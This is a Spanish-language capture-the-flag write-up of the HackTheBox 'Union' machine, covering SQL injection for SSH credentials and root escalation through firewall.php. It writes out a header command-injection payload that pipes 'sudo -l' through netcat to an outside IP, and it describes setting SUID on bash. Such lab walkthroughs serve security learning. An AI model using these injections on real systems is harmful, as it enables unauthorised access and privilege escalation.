---
layout: single
title: Union - HackTheBox
excerpt: "Exploitamos una inyección SQL para obtener acceso SSH en la máquina Union de HackTheBox. Luego, escalamos privilegios aprovechando un fallo en firewall.php, logrando ejecución como root"
date: 2025-03-30
classes: wide
header:
  teaser: /assets/images/Union/Union.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Red Team
tags:  
  - CTF
  - SQL Injection
  - Web Exploitation
---

![](/assets/images/Union/Union.png){:style="max-width:450px;height:auto;"}

## Resumen

La máquina Union de HackTheBox comienza con un escaneo de puertos, donde encontramos un servicio web vulnerable a SQL Injection. Explotamos esta vulnerabilidad para extraer información de la base de datos y obtener credenciales de acceso por SSH. Una vez dentro, identificamos un archivo firewall.php que ejecuta comandos con sudo sin necesidad de contraseña. Aprovechamos esta configuración para escalar privilegios y obtener acceso como root, logrando la explotación completa de la máquina.

## Reconocimiento

Realizamos un escaneo de puertos con nmap para identificar los servicios disponibles. Y también ejecutamos scripts básicos de reconocimiento con nmap:

![](/assets/images/Union/Reconocimiento-Puertos-Scripts.png)

El servidor expone los siguientes servicios:

- HTTP en el puerto 80

## Página Web

El servicio web en el puerto 80 parece ser una inscripción para UHC:

![](/assets/images/Union/Web.png)

## Shell

En el servicio web, si añadimos cualquier cosa al campo 'Player Elegibility Check' nos saldrá lo siguiente:

![](/assets/images/Union/Web-Test.png)

Si nos dirigimos donde dice 'Complete the challenge here' nos dirigirá aquí:

![](/assets/images/Union/Web-Flag.png)

Nos dice que pongamos la primera bandera, como no tenemos ninguna, vamos a dirigirnos de vuelta al formulario anterior, para comprobar si es vulnerable a inyección SQL:

![](/assets/images/Union/Web-Test-SQLI.png)

Confirmamos la vulnerabilidad a SQLI y procedemos a enumerar las tablas de la base de datos.

![](/assets/images/Union/Tables.png)

Una vez listadas las tablas, vemos que hay dos columnas ('flag' y 'players'), vamos a listar las columnas:

![](/assets/images/Union/Columns.png)

Y listamos el contenido:

![](/assets/images/Union/Columns-Content.png)

Una vez tenemos la 'flag', nos dirigimos a la web, para ponerlo en el formulario donde nos pedía la flag:

![](/assets/images/Union/Open-SSH.png)

Nos dice que a nuestra IP le han dado acceso por SSH al servidor, si realizamos un nuevo escaneo con nmap, vemos que se ha abierto el puerto 22:

![](/assets/images/Union/Nmap-SSH.png)

Como todavía no tenemos credenciales, vamos a buscar archivos php en la web con la herramienta 'wfuzz':

![](/assets/images/Union/Fuzz.png)

El archivo 'config.php' podría contener algo.

Si miramos el contenido del archivo 'config.php' mediante 'SQLI', podemos ver las credenciales para conectarnos vía SSH:

![](/assets/images/Union/Credential-SSH.png)

Nos conectamos:

![](/assets/images/Union/Shell.png)

Y una vez dentro, la bandera 'user' se encuentra en el directorio 'home' del usuario 'uhc':

![](/assets/images/Union/User-Flag.png)

## Escalada de Privilegios

Si nos dirigimos al directorio '/var/www/html/', veremos que existe un archivo llamado 'firewall.php':

![](/assets/images/Union/Firewall-File.png)

Observamos que el usuario 'www-data' ejecuta un comando con 'sudo' a través de la función 'system', lo que permite ejecutar comandos con privilegios elevados.

Analizando el código marcado, nos damos cuenta de que la petición se está realizando mediante la herramienta 'curl', si tratamos de hacer nosotros una petición editando la cabecera, podemos llegar a ejecutar comandos:

![](/assets/images/Union/Curl-Vuln.png)

    -H # Header
    X-FORWARDED-FOR: # Header http
    1.1.1.1 # Ip
    ; # Concatenar
    sudo -l | nc 10.10.16.21 4646 # Comando bash
    ; # Cierre de la concatenación

    -H # Header
    Cookie: PHPSESSID= # Cookie
    p3m9e... # La cookie que nos da la página firewall.php cuando metimos la flag correcta

Como vemos que el usuario 'www-data' tiene permisos '(ALL : ALL) NOPASSWD: ALL', vamos a hacer otra petición para dar permisos 'suid' al binario '/usr/bin/bash', para escalar al usuario privilegiado:

![](/assets/images/Union/Sudo-Bash.png)

Ahora que somos el usuario privilegiado, si nos dirigimos al directorio 'home' del usuario 'root', nos encontraremos con la bandera 'root':

![](/assets/images/Union/Root-Flag.png)

### Conclusión

Esta máquina demuestra la importancia de proteger las aplicaciones web contra inyecciones SQL y de restringir adecuadamente los permisos de ejecución de comandos en entornos con privilegios elevados. También resalta la utilidad de analizar scripts y configuraciones en busca de posibles vectores de escalada de privilegios. En un entorno real, mitigar estas vulnerabilidades evitaría accesos no autorizados y compromisos de seguridad.
